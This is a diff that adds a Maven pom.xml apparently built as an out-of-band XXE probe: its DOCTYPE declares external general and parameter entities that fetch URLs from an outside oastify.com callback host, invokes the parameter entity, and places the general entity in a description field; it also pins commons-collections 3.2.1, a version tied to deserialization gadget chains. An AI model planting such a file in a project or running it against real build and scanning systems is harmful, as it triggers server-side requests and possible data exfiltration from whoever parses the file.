@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE project [
+  <!ENTITY xxe SYSTEM "https://suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/xxe-pom">
+  <!ENTITY % remote SYSTEM "https://suq0kp9syyx7l521vsh12wacs3yumka9.oastify.com/xxe-param">
+  %remote;
+]>
+<project xmlns="http://maven.apache.org/POM/4.0.0">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>com.probe</groupId>
+  <artifactId>xxe-probe</artifactId>
+  <version>1.0.0</version>
+  <dependencies>
+    <dependency><groupId>commons-collections</groupId><artifactId>commons-collections</artifactId><version>3.2.1</version></dependency>
+    <description>&xxe;</description>
+  </dependencies>
+</project>
